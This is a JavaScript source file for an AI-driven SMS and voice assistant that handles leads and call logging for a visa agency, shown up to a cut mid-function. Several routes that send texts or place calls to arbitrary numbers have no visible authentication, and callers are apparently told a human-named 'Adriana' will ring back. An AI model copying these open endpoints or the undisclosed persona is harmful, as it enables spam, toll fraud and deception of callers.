/**
 * Sevyn Stark SMS Agent
 * Handles incoming SMS and sends AI-powered responses
 * Also supports outbound SMS for follow-ups
 */

require('dotenv').config();
const express = require('express');
const twilio = require('twilio');
const OpenAI = require('openai');
const path = require('path');

// Security & Auth
const { setupSecurity } = require('./security');
const { setupAuthRoutes, requireAuth } = require('./auth-db');

const app = express();

// Setup security middleware FIRST
setupSecurity(app);

app.use(express.urlencoded({ extended: true }));

// (Stripe webhook removed — not used in O1dMatch ops app)
app.use('/_unused-stripe', express.json({
  verify: (req, res, buf) => {
    req.rawBody = buf;
  }
}));

// JSON parser for all other routes
app.use(express.json());

// Setup auth routes
setupAuthRoutes(app);

// Root redirect to dashboard (which requires auth)
app.get('/', (req, res) => {
  res.redirect('/dashboard');
});

// Protected dashboard route
app.get('/dashboard', requireAuth, (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Pretty alias for the call history page (clicked from the dashboard)
app.get('/calls', requireAuth, (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'calls.html'));
});

// Pretty alias for admin
app.get('/admin', requireAuth, (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// Protected admin route (requires auth - admin check done client-side + API-level)
app.get('/admin.html', requireAuth, (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// Serve static frontend
app.use(express.static(path.join(__dirname, 'public')));

// Initialize clients
const twilioClient = twilio(
  process.env.TWILIO_ACCOUNT_SID,
  process.env.TWILIO_AUTH_TOKEN
);
const openai = new OpenAI({ apiKey: process.env.OPENAI_API_KEY });

// Sevyn's personality and knowledge - OPERATIONS MODE (March 2026)
// Phone/SMS is for new business only; existing clients directed to email
const SEVYN_SYSTEM_PROMPT = `You are Sevyn Stark, the AI assistant for Sherrod Sports Visas and Innovative Global Talent Agency.

=== OPERATIONS MODE (ACTIVE) ===
We're running lean due to team changes:
- ALL case support goes through EMAIL only
- SMS is for new business leads and routing
- Response time for emails: 1-3 business days
- No phone/SMS support for existing clients

PERSONALITY:
- Warm, professional, helpful
- Concise in SMS (keep under 160 chars when possible)
- Direct - don't waste people's time
- Apologetic about limited phone support, but confident about email

KEY CONTACTS BY COMPANY:

Sherrod Sports Visas (Athletes):
→ Email: gabriella@sherrodsportsvisas.com

IGTA (Tech/Business professionals):
→ Email: gabriella@innovativeglobaltalent.com

O1dMatch (Eligibility check):
→ Website: o1dmatch.com (free!)

HOW TO RESPOND:

**NEW LEAD** (never worked with us):
- Be enthusiastic
- Ask: What field? What country? What are you looking for?
- Collect: name, email, profession
- Say: "Our team will review and email you within 1-3 business days!"

**EXISTING CLIENT** (asking for case update):
Standard response:
"Hi! For case updates, please email gabriella@sherrodsportsvisas.com. We're handling all support through email right now (1-3 business days). 📧"

If they push:
"I know it's not ideal - we've had some team changes. Email is how we track everything. Sherrod personally reviews cases during this transition."

**URGENT MATTER**:
"This sounds urgent. Please email [appropriate address] AND text me the details. I'll flag it for priority review."

SERVICES & PRICING (if asked):
- P-1A (Athletes): $6,000
- O-1A (Extraordinary): $8,000
- O-1B (Arts): $7,000
- Petitioner Service: $1,500-$2,000
- $500 eligibility review (credited if you proceed)

DO NOT:
- Promise phone callbacks
- Give legal advice
- Make up information
- Promise specific outcomes

Keep SMS responses to 1-2 messages max. End with a clear next step.`;

// Conversation history (in-memory, consider Redis for production)
const conversations = new Map();

/**
 * Handle incoming SMS
 */
app.post('/sms', async (req, res) => {
  const from = req.body.From;
  const body = req.body.Body;
  const to = req.body.To;

  console.log(`📱 SMS from ${from}: ${body}`);

  try {
    // Sales training line — tell texters to call instead
    if (to === '+19803032854') {
      console.log(`📱 Sales training line SMS — redirecting to call`);
      const twiml = new twilio.twiml.MessagingResponse();
      twiml.message("Hey! This is Sevyn. This number is for live sales training evaluations — text won't cut it. Call me at (980) 303-2854 and pitch me on O1DMatch. I'll score you when we're done. Good luck!");
      res.type('text/xml');
      return res.send(twiml.toString());
    }

    // Get or create conversation history
    if (!conversations.has(from)) {
      conversations.set(from, []);
    }
    const history = conversations.get(from);

    // Add user message
    history.push({ role: 'user', content: body });

    // Keep only last 10 messages for context
    if (history.length > 10) {
      history.splice(0, history.length - 10);
    }

    // Generate response
    const response = await openai.chat.completions.create({
      model: 'gpt-4o-mini',
      messages: [
        { role: 'system', content: SEVYN_SYSTEM_PROMPT },
        ...history
      ],
      max_tokens: 300,
      temperature: 0.7
    });

    const reply = response.choices[0].message.content;
    
    // Add assistant response to history
    history.push({ role: 'assistant', content: reply });

    console.log(`💬 Sevyn replies: ${reply}`);

    // Send TwiML response
    const twiml = new twilio.twiml.MessagingResponse();
    twiml.message(reply);
    
    res.type('text/xml');
    res.send(twiml.toString());

  } catch (error) {
    console.error('Error processing SMS:', error);
    
    const twiml = new twilio.twiml.MessagingResponse();
    twiml.message("Hi! This is Sevyn. I'm having a moment - please try again or call (980) 350-2728.");
    
    res.type('text/xml');
    res.send(twiml.toString());
  }
});

/**
 * Send outbound SMS
 */
/**
 * Brand name lookup for AI-enhanced SMS
 */
const SMS_BRAND_NAMES = {
  '+15617944621': 'Adriana from O1dMatch',
  '+19803032854': 'Sevyn, O1DMatch Sales Training evaluator'
};

/**
 * Enhance a message with AI for a specific brand
 */
async function enhanceMessageWithAI(message, fromNumber) {
  const brandIdentity = SMS_BRAND_NAMES[fromNumber] || 'a professional assistant';
  const enhanced = await openai.chat.completions.create({
    model: 'gpt-4o-mini',
    messages: [
      {
        role: 'system',
        content: `You are ${brandIdentity}. Rewrite this message in a warm, professional tone appropriate for the brand. Keep it under 160 characters if possible. Do not add quotes around the message. Do not add a signature — the recipient already knows who is texting.`
      },
      { role: 'user', content: message }
    ],
    max_tokens: 100
  });
  return enhanced.choices[0].message.content;
}

/**
 * Preview AI-enhanced SMS (does not send)
 */
app.post('/api/sms/preview', async (req, res) => {
  const { message, from } = req.body;

  if (!message) {
    return res.status(400).json({ error: 'Missing message' });
  }

  try {
    const fromNumber = from || process.env.TWILIO_PHONE_NUMBER || '+19803032854';
    const enhanced = await enhanceMessageWithAI(message, fromNumber);
    res.json({ success: true, original: message, enhanced });
  } catch (error) {
    console.error('SMS preview error:', error.message);
    res.status(500).json({ error: 'Failed to enhance message' });
  }
});

/**
 * Send outbound SMS
 */
app.post('/send', async (req, res) => {
  const { to, message, useAI, from } = req.body;

  if (!to || !message) {
    return res.status(400).json({ error: 'Missing "to" or "message"' });
  }

  // Normalize destination number to E.164
  const toNumber = to.startsWith('+') ? to : `+1${to.replace(/\D/g, '')}`;

  // Use specified from number, fall back to env var
  const fromNumber = from || process.env.TWILIO_PHONE_NUMBER || '+19803032854';

  try {
    let finalMessage = message;

    // Optionally enhance message with AI (brand-aware)
    if (useAI) {
      finalMessage = await enhanceMessageWithAI(message, fromNumber);
    }

    // Send SMS via Twilio
    const result = await twilioClient.messages.create({
      body: finalMessage,
      from: fromNumber,
      to: toNumber
    });

    console.log(`📤 SMS ${result.status} | From: ${fromNumber} → To: ${toNumber} | SID: ${result.sid}`);

    // Check for immediate failure statuses
    if (result.status === 'failed' || result.status === 'undelivered') {
      console.error(`❌ SMS failed immediately: ${result.errorCode} - ${result.errorMessage}`);
      return res.status(500).json({
        success: false,
        error: `SMS failed: ${result.errorMessage || 'Unknown error'}. This number may not have SMS capability.`,
        errorCode: result.errorCode
      });
    }

    // If queued, check delivery status after a short delay
    // Twilio may accept but carrier can reject (e.g. 30034 A2P blocking)
    if (result.status === 'queued' || result.status === 'accepted') {
      // Wait 3 seconds and check actual status
      await new Promise(r => setTimeout(r, 3000));
      try {
        const updatedMsg = await twilioClient.messages(result.sid).fetch();
        console.log(`   📋 Status after 3s: ${updatedMsg.status} | err: ${updatedMsg.errorCode || 'none'}`);

        if (updatedMsg.status === 'undelivered' || updatedMsg.status === 'failed') {
          let errorDetail = updatedMsg.errorMessage || 'Message was blocked';
          if (updatedMsg.errorCode === 30034) {
            errorDetail = 'Message blocked by carrier. Your Twilio numbers need A2P 10DLC registration to send SMS to US numbers. Register at Twilio Console → Messaging → Trust Hub.';
          } else if (updatedMsg.errorCode === 30008) {
            errorDetail = 'Message could not be delivered. The carrier rejected it.';
          }
          return res.json({
            success: false,
            error: errorDetail,
            errorCode: updatedMsg.errorCode,
            sid: result.sid
          });
        }

        return res.json({
          success: true,
          sid: result.sid,
          status: updatedMsg.status,
          to: result.to,
          from: result.from,
          message: finalMessage
        });
      } catch (fetchErr) {
        // If status check fails, return the original queued status
        console.error('   ⚠️ Could not verify SMS status:', fetchErr.message);
      }
    }

    res.json({
      success: true,
      sid: result.sid,
      status: result.status,
      to: result.to,
      from: result.from,
      message: finalMessage
    });

  } catch (error) {
    console.error('❌ SMS error:', error.message, error.code ? `(${error.code})` : '');

    // Provide helpful error messages for common Twilio errors
    let userError = error.message;
    if (error.code === 21610) {
      userError = 'This number has opted out of SMS. They need to text START to opt back in.';
    } else if (error.code === 21211) {
      userError = 'Invalid destination phone number.';
    } else if (error.code === 21606 || error.code === 21612) {
      userError = `The from number (${fromNumber}) is not SMS-capable. Try a different brand number.`;
    } else if (error.code === 21408) {
      userError = 'SMS not enabled for this region. Check Twilio geo permissions.';
    }

    res.status(500).json({ error: userError });
  }
});

/**
 * Bulk send follow-ups
 */
app.post('/followup', async (req, res) => {
  const { contacts, template } = req.body;
  
  // contacts: [{ name: "John", phone: "+1234567890", context: "P-1 inquiry" }]
  // template: "Hi {name}, following up on your {context}. Ready to proceed?"

  if (!contacts || !template) {
    return res.status(400).json({ error: 'Missing contacts or template' });
  }

  const results = [];
  
  for (const contact of contacts) {
    try {
      // Personalize message
      let message = template
        .replace('{name}', contact.name || 'there')
        .replace('{context}', contact.context || 'visa inquiry');

      // Enhance with AI for natural tone
      const enhanced = await openai.chat.completions.create({
        model: 'gpt-4o-mini',
        messages: [
          { 
            role: 'system', 
            content: 'You are Sevyn Stark. Make this follow-up message warm and personal. Keep under 160 chars. No quotes.' 
          },
          { role: 'user', content: message }
        ],
        max_tokens: 80
      });

      const finalMessage = enhanced.choices[0].message.content;

      // Send via Twilio from Sevyn's number
      const result = await twilioClient.messages.create({
        body: finalMessage,
        from: process.env.TWILIO_PHONE_NUMBER || '+19803032854',
        to: contact.phone.startsWith('+') ? contact.phone : `+1${contact.phone.replace(/\D/g, '')}`
      });

      results.push({
        name: contact.name,
        phone: contact.phone,
        status: 'sent',
        sid: result.sid,
        message: finalMessage
      });

      // Rate limit - wait 1 second between messages
      await new Promise(r => setTimeout(r, 1000));

    } catch (error) {
      results.push({
        name: contact.name,
        phone: contact.phone,
        status: 'failed',
        error: error.message
      });
    }
  }

  res.json({ results });
});

/**
 * Health check
 */
app.get('/health', (req, res) => {
  res.json({ 
    status: 'ok', 
    agent: 'Sevyn Stark SMS',
    phone: process.env.TWILIO_PHONE_NUMBER 
  });
});

/**
 * Stats endpoint for dashboard - reads from Supabase
 */
const { getStats, getDashboardData } = require('./database/supabase');

app.get('/api/stats', async (req, res) => {
  try {
    const stats = await getStats();
    res.json({
      calls: stats.total_calls || 0,
      sms: stats.total_sms || 0,
      leads: stats.total_leads || 0,
      byBrand: stats.calls_by_brand || {}
    });
  } catch (error) {
    console.error('Stats error:', error);
    res.json({ calls: 0, sms: 0, leads: 0, error: error.message });
  }
});

// Note: /api/dashboard and /api/call routes are defined below in DASHBOARD API ROUTES section

/**
 * Get all configured brands
 */
app.get('/api/brands', (req, res) => {
  const { BRAND_CONFIG } = require('./inbound-voice');
  const brands = Object.entries(BRAND_CONFIG).map(([phone, config]) => ({
    phone,
    ...config
  }));
  res.json({ brands });
});

/**
 * Inbound Voice - Conversational AI
 * Uses Bland.ai for intelligent conversations, with VIP routing
 */
const { 
  handleInboundTransfer, 
  createInboundAICall, 
  getBrandConfig, 
  getVIPStatus 
} = require('./inbound-voice');

app.post('/voice', (req, res) => {
  const calledNumber = req.body.Called || req.body.To || '';
  const callerNumber = req.body.From || '';
  
  const brand = getBrandConfig(calledNumber);
  const vip = getVIPStatus(callerNumber);
  
  console.log(`📞 Inbound call: ${callerNumber} → ${calledNumber} (${brand.brand})`);
  if (vip) console.log(`   ⭐ VIP: ${vip.name}`);
  
  const twiml = new twilio.twiml.VoiceResponse();
  
  // VIP priority routing - connect directly or special handling
  if (vip && vip.action === 'priority') {
    twiml.say({ voice: 'Polly.Joanna' }, `Hey ${vip.name.split(' ')[0]}! Let me connect you right away.`);
    twiml.dial({ timeout: 30, callerId: calledNumber }, '+15617408303'); // Direct to Sherrod
    twiml.say({ voice: 'Polly.Joanna' }, "Sherrod isn't available. Let me take a message.");
    // Fall through to AI if no answer
  }
  
  // Use Bland.ai API for fully conversational AI with brand context
  // Play brief hold message, then Bland.ai calls them back immediately
  twiml.say({ voice: 'Polly.Joanna' }, `Thank you for calling ${brand.name}. Please hold for just a moment.`);
  twiml.pause({ length: 2 });
  twiml.say({ voice: 'Polly.Joanna' }, `Adriana will be right with you.`);
  twiml.hangup();
  
  // Trigger Bland.ai to call them back with full brand context
  setImmediate(async () => {
    try {
      await new Promise(r => setTimeout(r, 1500));
      await createInboundAICall(callerNumber, calledNumber, {
        webhookUrl: process.env.BASE_URL ? `${process.env.BASE_URL}/call-complete` : null
      });
      console.log(`   ✅ Bland.ai callback initiated for ${brand.brand}`);
    } catch (error) {
      console.error('Failed to initiate Bland.ai callback:', error);
    }
  });
  
  res.type('text/xml');
  res.send(twiml.toString());
});

/**
 * AI-powered voice endpoint - uses Bland.ai to handle full conversation
 * Call this endpoint for full conversational AI (not just forward)
 */
app.post('/voice-ai', async (req, res) => {
  const calledNumber = req.body.Called || req.body.To || '';
  const callerNumber = req.body.From || '';
  
  const brand = getBrandConfig(calledNumber);
  const vip = getVIPStatus(callerNumber);
  
  console.log(`📞 AI Voice: ${callerNumber} → ${calledNumber} (${brand.brand})`);
  
  const twiml = new twilio.twiml.VoiceResponse();
  
  // Play hold message
  twiml.say({ voice: 'Polly.Joanna' }, 'Thanks for calling! One moment while I connect you with Adriana.');
  twiml.pause({ length: 1 });
  twiml.say({ voice: 'Polly.Joanna' }, 'Adriana will call you right back on this number.');
  twiml.hangup();
  
  // Trigger Bland.ai to call them back with AI
  setImmediate(async () => {
    try {
      await new Promise(r => setTimeout(r, 2000));
      const webhookUrl = process.env.BASE_URL ? `${process.env.BASE_URL}/call-complete` : null;
      await createInboundAICall(callerNumber, calledNumber, { webhookUrl });
    } catch (error) {
      console.error('Bland.ai callback failed:', error);
    }
  });
  
  res.type('text/xml');
  res.send(twiml.toString());
});

/**
 * Voice callback from Bland.ai
 * Receives call summaries and forwards to Sherrod
 */
app.post('/voice-callback', async (req, res) => {
  console.log('📞 Voice callback received:', JSON.stringify(req.body, null, 2));
  
  const { call_id, summary, concatenated_transcript, to, from, call_length, completed } = req.body;
  
  if (!completed || !summary) {
    return res.json({ status: 'ignored', reason: 'call not completed or no summary' });
  }
  
  // Format message for Sherrod
  const message = `📞 CALL MESSAGE from Sevyn:\n\nFrom: ${from}\nDuration: ${Math.round(call_length || 0)} min\n\n${summary}\n\n[Call ID: ${call_id}]`;
  
  try {
    // Send SMS to Sherrod
    await twilioClient.messages.create({
      body: message,
      from: process.env.TWILIO_PHONE_NUMBER || '+19803032854',
      to: '+15617408303' // Sherrod's phone
    });
    
    console.log('✅ Call summary sent to Sherrod');
    res.json({ status: 'ok', forwarded: true });
  } catch (error) {
    console.error('Error forwarding call summary:', error);
    res.json({ status: 'error', message: error.message });
  }
});

/**
 * Call completion webhook - receives data from Bland.ai
 */
// (legacy Bland.ai call-complete + leads endpoints removed — Vapi only)

/**
 * Set a reminder (creates a scheduled callback)
 */
app.post('/reminder', async (req, res) => {
  const { message, phone, delayMinutes } = req.body;
  
  if (!message) {
    return res.status(400).json({ error: 'Missing message' });
  }
  
  const targetPhone = phone || '+15617408303'; // Default to Sherrod
  const delay = (delayMinutes || 5) * 60 * 1000; // Convert to ms
  
  // Schedule the reminder
  setTimeout(async () => {
    try {
      await twilioClient.messages.create({
        body: `⏰ REMINDER from Sevyn:\n\n${message}`,
        from: process.env.TWILIO_PHONE_NUMBER || '+19803032854',
        to: targetPhone
      });
      console.log(`✅ Reminder sent: ${message}`);
    } catch (error) {
      console.error('Error sending reminder:', error);
    }
  }, delay);
  
  const reminderTime = new Date(Date.now() + delay);
  console.log(`⏰ Reminder scheduled for ${reminderTime.toLocaleTimeString()}: ${message}`);
  
  res.json({ 
    status: 'scheduled', 
    message, 
    willSendAt: reminderTime.toISOString(),
    phone: targetPhone 
  });
});

/**
 * ============================================
 * RETELL AI ROUTES (Inbound Voice)
 * ============================================
 */

// Voice provider router (switches between Retell and Vapi via VOICE_PROVIDER env)
const voice = require('./voice');

// Vapi webhook for call events
if (voice.handleVapiWebhook) {
  app.post('/vapi/webhook', voice.handleVapiWebhook);
}

// ============================================
// HUMAN CLICK-TO-CALL (Twilio Voice SDK / WebRTC)
// ============================================

// Issue a JWT access token so the dashboard browser can register as a Twilio
// Proxy a Twilio recording through our server. Twilio recording URLs
// require basic auth (Account SID + Auth Token) — without this proxy the
// browser would prompt the user with a login popup. Auth-gated to dashboard
// users. Only allows fetching recordings on our own Twilio account.
app.get('/api/twilio-recording/:sid', requireAuth, async (req, res) => {
  const sid = req.params.sid.replace(/\.(mp3|wav)$/, '');
  if (!/^RE[a-f0-9]{32}$/i.test(sid)) {
    return res.status(400).send('Invalid recording SID');
  }
  const ext = req.params.sid.endsWith('.wav') ? 'wav' : 'mp3';
  const url = `https://api.twilio.com/2010-04-01/Accounts/${process.env.TWILIO_ACCOUNT_SID}/Recordings/${sid}.${ext}`;
  const auth = 'Basic ' + Buffer.from(`${process.env.TWILIO_ACCOUNT_SID}:${process.env.TWILIO_AUTH_TOKEN}`).toString('base64');

  try {
    const upstream = await fetch(url, { headers: { Authorization: auth, Range: req.headers.range || '' } });
    if (!upstream.ok && upstream.status !== 206) {
      return res.status(upstream.status).send(`Twilio: ${upstream.statusText}`);
    }
    res.setHeader('Content-Type', upstream.headers.get('content-type') || `audio/${ext === 'wav' ? 'wav' : 'mpeg'}`);
    if (upstream.headers.get('content-length')) res.setHeader('Content-Length', upstream.headers.get('content-length'));
    if (upstream.headers.get('content-range'))  res.setHeader('Content-Range', upstream.headers.get('content-range'));
    if (upstream.headers.get('accept-ranges'))  res.setHeader('Accept-Ranges', upstream.headers.get('accept-ranges'));
    res.setHeader('Cache-Control', 'private, max-age=3600');
    res.status(upstream.status);
    const { Readable } = require('stream');
    Readable.fromWeb(upstream.body).pipe(res);
  } catch (err) {
    console.error('Recording proxy error:', err.message);
    res.status(502).send('Failed to fetch recording');
  }
});

// Voice SDK device and place outbound calls through the user's mic/speakers.
app.get('/api/twilio-token', requireAuth, (req, res) => {
  try {
    const AccessToken = twilio.jwt.AccessToken;
    const VoiceGrant = AccessToken.VoiceGrant;

    const accountSid = process.env.TWILIO_ACCOUNT_SID;
    const apiKey = process.env.TWILIO_API_KEY;
    const apiSecret = process.env.TWILIO_API_SECRET;
    const twimlAppSid = process.env.TWILIO_TWIML_APP_SID;

    if (!apiKey || !apiSecret || !twimlAppSid) {
      return res.status(500).json({
        error: 'WebRTC not configured. Missing TWILIO_API_KEY / TWILIO_API_SECRET / TWILIO_TWIML_APP_SID.'
      });
    }

    const identity = `dashboard-${(req.user && req.user.id) || 'user'}`;
    const token = new AccessToken(accountSid, apiKey, apiSecret, { identity, ttl: 3600 });
    token.addGrant(new VoiceGrant({
      outgoingApplicationSid: twimlAppSid,
      incomingAllow: false
    }));

    res.json({ token: token.toJwt(), identity });
  } catch (err) {
    console.error('Twilio token error:', err.message);
    res.status(500).json({ error: 'Failed to mint token' });
  }
});

// TwiML endpoint hit by Twilio when the browser initiates a call. The SDK
// passes custom params via `connect({ params: ... })`, which Twilio forwards
// to this URL. We use unique names (targetNumber / callerIdNumber) so they
// don't collide with Twilio's standard `To` / `From` webhook fields.
app.post('/api/twilio-voice-twiml', (req, res) => {
  const to = req.body.targetNumber || req.query.targetNumber || req.body.To;
  const from = req.body.callerIdNumber || req.query.callerIdNumber || process.env.TWILIO_PHONE_NUMBER;

  console.log(`📞 Human click-to-call: ${from} → ${to}`);

  const twiml = new twilio.twiml.VoiceResponse();
  if (!to) {
    console.log(`   ⚠️ No targetNumber provided. Body: ${JSON.stringify(req.body)}`);
    twiml.say('No destination number provided. Please try again.');
    twiml.hangup();
  } else {
    // Fire a status callback when the dial finishes so we can log the call.
    // Twilio POSTs the brand callerId and dialed number back to us.
    const base = process.env.PUBLIC_URL || 'https://sevyn-sms-agent-production.up.railway.app';
    const statusUrl = `${base}/api/twilio-call-status?brand=${encodeURIComponent(from)}&target=${encodeURIComponent(to)}`;
    const dialOpts = {
      callerId: from,
      answerOnBridge: true,
      timeout: 30,
      action: statusUrl,
      method: 'POST'
    };
    // Opt-in recording via env flag — many US states require two-party
    // consent, so this is off by default. Set HUMAN_CALL_RECORDING=true
    // to enable.
    const recordingOn = process.env.HUMAN_CALL_RECORDING === 'true';
    if (recordingOn) {
      dialOpts.record = 'record-from-answer-dual';
      dialOpts.recordingStatusCallback = `${base}/api/twilio-recording-status`;
      dialOpts.recordingStatusCallbackMethod = 'POST';
    }
    const dial = twiml.dial(dialOpts);
    // When recording is on, the called party hears a brief disclosure right
    // when they pick up — before being bridged. Twilio fetches this URL for
    // TwiML to play to them. Satisfies two-party consent in CA/FL/PA/etc.
    if (recordingOn) {
      dial.number({ url: `${base}/api/twilio-recording-disclosure` }, to);
    } else {
      dial.number(to);
    }
  }

  res.type('text/xml');
  res.send(twiml.toString());
});

// Twilio fires this when a WebRTC (human click-to-call) dial finishes.
// Body has DialCallStatus, DialCallDuration, DialCallSid + the brand/target
// we passed via query string. NOTE: in a <Dial action="..."> callback,
// req.body.CallSid is the PARENT (client/browser leg). The dial-child SID
// is req.body.DialCallSid. Recordings on <Dial> are saved against the
// PARENT SID, so we use that as the row's primary call_id — otherwise the
// recording-status callback later can't find the row to update.
app.post('/api/twilio-call-status', async (req, res) => {
  const brand = req.query.brand || req.body.brand || '';
  const target = req.query.target || req.body.target || req.body.Called || '';
  const dialStatus = req.body.DialCallStatus || req.body.CallStatus || 'completed';
  const dialDurationSec = parseInt(req.body.DialCallDuration || '0', 10);
  const parentSid = req.body.CallSid || `human_${Date.now()}`;
  const dialSid = req.body.DialCallSid || '';
  const clientFrom = req.body.From || '';

  console.log(`\n📞 WebRTC call ended: ${target} (status=${dialStatus}, ${dialDurationSec}s, parent=${parentSid})`);

  // Resolve brand from the callerId number
  const { getBrandConfig } = require('./voice');
  const brandConfig = getBrandConfig(brand);

  const callData = {
    call_id: parentSid,
    brand: brandConfig.brand || 'Unknown',
    caller_phone: target || 'unknown',
    caller_name: null,
    caller_email: null,
    caller_type: 'human_outbound',
    inquiry_topic: null,
    outcome: dialStatus,
    follow_up_needed: false,
    call_duration_min: Math.max(1, Math.round(dialDurationSec / 60)) || null,
    summary: `Human (WebRTC) call placed from dashboard — agent talked directly with ${target} for ${dialDurationSec}s. Status: ${dialStatus}.`,
    transcript: null,
    recording_url: null,
    timestamp: new Date().toISOString(),
    direction: 'outbound',
    metadata: {
      provider: 'twilio_webrtc',
      direction: 'outbound',
      dial_sid: dialSid,
      parent_sid: parentSid,
      client_from: clientFrom,
      brand_phone: brand
    }
  };

  try {
    const { saveCall, updateStatsForCall } = require('./database/supabase');
    await saveCall(callData);
    await updateStatsForCall(brandConfig.brand);
  } catch (err) {
    console.error('   ❌ Supabase save failed:', err.message);
  }

  // When recording is on, we wait for the recording-status callback to write
  // to Sheets with the full Whisper+GPT summary. Otherwise, write now.
  if (process.env.HUMAN_CALL_RECORDING !== 'true') {
    try {
      const { writeCallLog } = require('./database/sheets');
      await writeCallLog({
        call_id: parentSid,
        brand: brandConfig.brand || 'Unknown',
        caller_phone: target || 'unknown',
        caller_name: null,
        caller_email: null,
        caller_type: 'human_outbound',
        inquiry_topic: null,
        outcome: dialStatus,
        follow_up_needed: false,
        duration_min: dialDurationSec ? Math.max(1, Math.round(dialDurationSec / 60)) : null,
        summary: callData.summary
      });
      console.log('   📞 WebRTC call logged to Sheets (basic — recording disabled)');
    } catch (err) {
      console.error('   ❌ Sheets write failed:', err.message);
    }
  } else {
    console.log('   ⏳ Deferring Sheets write until recording is transcribed');
  }

  res.type('text/xml').send('<?xml version="1.0" encoding="UTF-8"?><Response></Response>');
});

// Played to the called party right when they pick up. Two-party consent
// disclosure for CA / FL / PA / etc. — happens before they're bridged.
app.post('/api/twilio-recording-disclosure', (req, res) => {
  const t = new twilio.twiml.VoiceResponse();
  t.say({ voice: 'Polly.Joanna' }, 'This call may be recorded for quality and training purposes.');
  res.type('text/xml').send(t.toString());
});

// Recording lifecycle: when Twilio finishes saving the recording, we fetch
// the audio, run it through Whisper for a transcript, then GPT-4o-mini for
// a summary + structured data. Result is patched onto the Supabase row and
// the full row is written to Google Sheets.
app.post('/api/twilio-recording-status', async (req, res) => {
  // Respond immediately so Twilio doesn't retry (this work takes 10-30s)
  res.sendStatus(200);

  const dialSid = req.body.CallSid || '';
  const recordingUrl = req.body.RecordingUrl || '';
  const recordingStatus = req.body.RecordingStatus || '';
  const recordingDuration = parseInt(req.body.RecordingDuration || '0', 10);

  if (recordingStatus !== 'completed' || !recordingUrl) {
    console.log(`📼 Recording status=${recordingStatus} (skipping)`);
    return;
  }

  const mp3Url = recordingUrl.endsWith('.mp3') ? recordingUrl : `${recordingUrl}.mp3`;
  console.log(`\n📼 WebRTC recording ready for ${dialSid}: ${mp3Url} (${recordingDuration}s)`);

  try {
    await processHumanCallRecording(dialSid, mp3Url, recordingDuration);
  } catch (err) {
    console.error('   ❌ Human recording pipeline failed:', err.message);
    // Even on failure, save the raw recording URL so user can listen
    try {
      const { supabaseRequest } = require('./database/supabase');
      await supabaseRequest('calls', 'PATCH', { recording_url: mp3Url }, `?call_id=eq.${dialSid}`);
    } catch (_) {}
  }
});

async function processHumanCallRecording(dialSid, mp3Url, durationSec) {
  const { supabaseRequest } = require('./database/supabase');
  const { writeCallLog, writeLeadToSheet } = require('./database/sheets');

  // Convert raw Twilio URL to our proxy URL so the browser can play the
  // audio without being prompted for Twilio's basic auth login.
  const sidMatch = mp3Url.match(/Recordings\/(RE[a-f0-9]{32})/i);
  const playableUrl = sidMatch ? `/api/twilio-recording/${sidMatch[1]}.mp3` : mp3Url;

  // 1. Save proxied URL right away so it's listenable in the dashboard
  await supabaseRequest('calls', 'PATCH', { recording_url: playableUrl }, `?call_id=eq.${dialSid}`);

  // 2. Fetch the audio with basic auth (we still need the raw Twilio URL here)
  const twilioAuth = 'Basic ' + Buffer.from(`${process.env.TWILIO_ACCOUNT_SID}:${process.env.TWILIO_AUTH_TOKEN}`).toString('base64');
  const audioRes = await fetch(mp3Url, { headers: { Authorization: twilioAuth } });
  if (!audioRes.ok) throw new Error(`Fetch recording: ${audioRes.status}`);
  const audioBuffer = Buffer.from(await audioRes.arrayBuffer());
  console.log(`   🎧 Downloaded ${audioBuffer.length} bytes of audio`);

  // 3. Transcribe with Whisper
  const fd = new FormData();
  fd.append('file', new Blob([audioBuffer], { type: 'audio/mpeg' }), 'recording.mp3');
  fd.append('model', 'whisper-1');
  const wRes = await fetch('https://api.openai.com/v1/audio/transcriptions', {
    method: 'POST',
    headers: { Authorization: `Bearer ${process.env.OPENAI_API_KEY}` },
    body: fd
  });
  if (!wRes.ok) throw new Error(`Whisper ${wRes.status}: ${await wRes.text()}`);
  const { text: rawTranscript } = await wRes.json();
  if (!rawTranscript) throw new Error('Whisper returned empty transcript');
  console.log(`   📝 Transcribed: ${rawTranscript.length} chars`);

  // 4. Format speaker labels + summarize with GPT-4o-mini
  const systemPrompt = `You are processing a sales/outreach call between an Agent (a Sherrod Seward team member who placed the call from a dashboard) and a Caller (the prospect/lead they reached). Given a raw transcript with no speaker labels, infer who's speaking and return JSON only.

Return:
{
  "transcript": "Agent: ...\\nCaller: ...\\n... (full conversation with speaker labels)",
  "summary": "2-3 sentence summary of what was discussed and any commitments",
  "caller_name": "extracted name of the called party, or null",
  "caller_email": "extracted email, or null",
  "inquiry_topic": "what the call was about (1 phrase)",
  "follow_up_needed": true/false (true if any next step was agreed),
  "caller_type": "new_lead" or "existing_client" or "other"
}`;

  const gRes = await fetch('https://api.openai.com/v1/chat/completions', {
    method: 'POST',
    headers: {
      Authorization: `Bearer ${process.env.OPENAI_API_KEY}`,
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      model: 'gpt-4o-mini',
      response_format: { type: 'json_object' },
      temperature: 0.2,
      messages: [
        { role: 'system', content: systemPrompt },
        { role: 'user', content: `Raw transcript:\n\n${rawTranscript}` }
      ]
    })
  });
  if (!gRes.ok) throw new Error(`GPT ${gRes.status}: ${await gRes.text()}`);
  const gData = await gRes.json();
  const analysis = JSON.parse(gData.choices[0].message.content);
  console.log(`   🤖 Analysis ready: "${analysis.summary?.substring(0, 80)}..."`);

  // 5. PATCH Supabase with full analysis
  await supabaseRequest('calls', 'PATCH', {
    transcript: analysis.transcript || rawTranscript,
    summary: analysis.summary || null,
    caller_name: analysis.caller_name || null,
    caller_email: analysis.caller_email || null,
    caller_type: analysis.caller_type || 'human_outbound',
    inquiry_topic: analysis.inquiry_topic || null,
    follow_up_needed: !!analysis.follow_up_needed
  }, `?call_id=eq.${dialSid}`);
  console.log(`   ✅ Patched Supabase with transcript + summary`);

  // 6. Fetch the row to write enriched data to Sheets
  const rows = await supabaseRequest('calls', 'GET', null, `?call_id=eq.${dialSid}&select=*`);
  const row = rows?.[0] || {};

  try {
    await writeCallLog({
      call_id: dialSid,
      brand: row.brand,
      caller_phone: row.caller_phone || 'unknown',
      caller_name: analysis.caller_name,
      caller_email: analysis.caller_email,
